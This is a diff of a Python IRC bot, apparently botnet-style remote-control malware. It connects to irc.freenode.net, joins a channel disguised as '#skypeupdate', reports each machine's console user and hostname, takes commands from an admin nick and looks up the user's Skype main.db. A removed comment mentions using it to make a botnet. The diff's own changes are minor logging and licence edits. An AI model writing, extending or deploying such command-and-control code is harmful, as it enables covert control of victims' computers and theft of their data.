@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # Nick Sweeting © 2013
-# share and share alike blah blah blah but for godsakes dont credit me, i dont want to get arrested if you make a botnet using this (dont)
+# MIT Liscence
 
 import socket
 import getpass
@@ -18,9 +18,18 @@ import skype
 #TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 
-version = "2.1.1"                                                   # bot version
+version = "2.1.2"                                                 # bot version
 
-def log(prefix, content=''):                                      # function used to log things to the console with a timestamp
+### Remove/comment this block to disable logging stdout/err to a file
+so = se = open("bot_v%s.log" % version, 'w', 0)
+# re-open stdout without buffering
+sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
+# redirect stdout and stderr to the log file
+os.dup2(so.fileno(), sys.stdout.fileno())
+os.dup2(se.fileno(), sys.stderr.fileno())
+### Endblock
+
+def log(prefix, content=''):                                      # function used to log things to stdout with a timestamp
     try:
         for line in content.split('\n'):
             print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
@@ -34,13 +43,13 @@ log("[*] IRC BOT v%s" % version)
 server = 'irc.freenode.net'
 port = 6667
 channel = '#skypeupdate'
-admin = 'thesquash'                                               # the nick to send privmsgs to
+admin = 'thesquash'                                               # the nick to send privmsgs to, and to check recieved message validity
 
-hostname = socket.gethostname()
-main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()
-local_user = getpass.getuser()
+hostname = socket.gethostname()									  # host's hostname
+main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()		# main user of the computer detected by current owner of /dev/console
+local_user = getpass.getuser()									  # user the bot is running as
 
-nick = '[%s|%s]' % (main_user, hostname)
+nick = '[%s|%s]' % (main_user, hostname)						  # bot's nickname
 
 helpmsg = '''Version: v%s\n
 Public Commands (main channel): \n
@@ -82,7 +91,7 @@ def sigterm_handler(signum, frame):                               # if user trie
     privmsg('----Subprocess Spawned----')
     irc.send ( 'QUIT\r\n' )
     irc.close()
-    raise SystemExit
+    raise SystemExit												
     sys.exit()
 
 def line_split(seq, n):                                           # if output is multiline, split based on \n and max chars per line (n)
